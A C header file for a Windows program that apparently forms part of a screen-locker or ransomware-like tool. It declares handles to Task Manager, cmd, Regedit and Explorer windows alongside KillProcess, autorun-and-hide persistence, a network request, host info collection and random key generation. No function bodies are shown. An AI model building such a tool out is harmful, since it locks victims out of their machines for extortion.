#ifndef UTIL_H
#define UTIL_H

#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <wchar.h>
#include <time.h>
#include <Shellapi.h>

#define FONT_SIZE 20 
#define LINE_SPACING 5
#define TIMER_ID 1              // 定时器ID
#define TIMER_INTERVAL 3000     // 定时器间隔（以毫秒为单位）

// extern 表示该变量需要再外部文件定义
extern HFONT font;
extern HWND hwnd;
extern HWND hwndEdit;
extern HWND hwndTaskbar;
extern HWND taskmgrWnd;
extern HWND cmdWnd;
extern HWND regEditWnd;
extern HWND explorerWnd;
extern HWND runWnd;
extern HWND WSG;

extern int screen_width;
extern int screen_height;

extern char ID[8];
extern char hostname[50];
extern char miYaoRoot[8];
extern char miYao[8];
extern int isLook;
extern int isWrong;

BOOL KillProcess(HWND hwnd);
void AutoRunAndHide();
void RemoveAutoRunAndUnhide();
void MakeRequest();
void GetInfo();
void RandomMiYao();
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

#endif